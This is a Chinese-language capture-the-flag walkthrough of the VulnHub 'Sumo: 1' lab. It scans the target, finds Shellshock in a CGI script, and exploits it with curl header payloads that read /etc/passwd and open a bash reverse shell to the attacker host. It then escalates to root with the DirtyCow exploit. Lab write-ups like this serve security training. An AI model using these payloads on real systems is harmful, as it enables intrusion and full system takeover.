# Sumo: 1

2024-5-18 https://www.vulnhub.com/entry/sumo-1,480/

difficulty: Beginner

## IP

192.168.10.179

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 06cb9ea3aff01048c417934a2c45d948 (DSA)
|   2048 b7c5427bbaae9b9b7190e747b4a4de5a (RSA)
|_  256 fa81cd002d52660b70fcb840fadb1830 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
```

80 web 端口默认页面没有信息，进行目录爆破：

```
gobuster dir -u http://192.168.10.179/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -e

200      GET        4l       25w      177c http://192.168.10.179/
200      GET        4l       25w      177c http://192.168.10.179/index
200      GET        4l       25w      177c http://192.168.10.179/index.html
200      GET        1l        3w       14c http://192.168.10.179/cgi-bin/test
```

index 中没有有用的信息，/cgi-bin/test 中 CGI Default ! ，应该可能存在 shellshock，进行测试：

```
nmap 192.168.10.179 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test

80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
```

表明可以进行利用：

```
curl -H 'x: () { :; };a=`/bin/cat /etc/passwd`;echo $a' 'http://192.168.10.179/cgi-bin/test.sh' -I

root: x:0:0:root:/root:/bin/bash
daemon: x:1:1:daemon:/usr/sbin:/bin/sh
bin: x:2:2:bin:/bin:/bin/sh
sys: x:3:3:sys:/dev:/bin/sh
sync: x:4:65534:sync:/bin:/bin/sync
games: x:5:60:games:/usr/games:/bin/sh
man: x:6:12:man:/var/cache/man:/bin/sh
lp: x:7:7:lp:/var/spool/lpd:/bin/sh
mail: x:8:8:mail:/var/mail:/bin/sh
news: x:9:9:news:/var/spool/news:/bin/sh
uucp: x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy: x:13:13:proxy:/bin:/bin/sh
www-data: x:33:33:www-data:/var/www:/bin/sh
backup: x:34:34:backup:/var/backups:/bin/sh
list: x:38:38:Mailing List Manager:/var/list:/bin/sh
irc: x:39:39:ircd:/var/run/ircd:/bin/sh
gnats: x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody: x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid: x:100:101::/var/lib/libuuid:/bin/sh
syslog: x:101:103::/home/syslog:/bin/false
messagebus: x:102:104::/var/run/dbus:/bin/false
sumo: x:1000:1000:sumo,,,:/home/sumo:/bin/bash
sshd: x:103:65534::/var/run/sshd:/usr/sbin/nologi
```

kali 上监听 8888，创建反弹连接：

```
curl -H 'x: () { :; }; /bin/bash -i >& /dev/tcp/192.168.10.3/8888 0>&1' 'http://192.168.10.179/cgi-bin/test.sh' -I
```

在反弹的 shell 中看到了源码：

```
www-data@ubuntu:/usr/lib/cgi-bin$ cat test
cat test
#! /bin/bash
echo "Content-type: text/html"
echo ""
echo "CGI Default !"
```

看到内核版本为 Linux ubuntu 3.2.0-23，可能存在内核提权漏洞，找到了可能的 exp 34134，下载到目标机器上，进行编译 dirtycow。

编译中提示 gcc: error trying to exec 'cc1': execvp: No such file or directory，看样子是环境变量设置有问题：

```
www-data@ubuntu:/tmp$ find / -type f -name cc1 2>/dev/null
/usr/lib/gcc/x86_64-linux-gnu/4.6/cc1

export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH

gcc -pthread 40839.c -o dirty -lcrypt
./dirty

You can log in with the username 'firefart' and the password '123456'.
```

切换到 firefart:123456，得到了 root 权限的 shell：

```
firefart@ubuntu:~# cat root.txt
{Sum0-SunCSR-2020_r001}
```
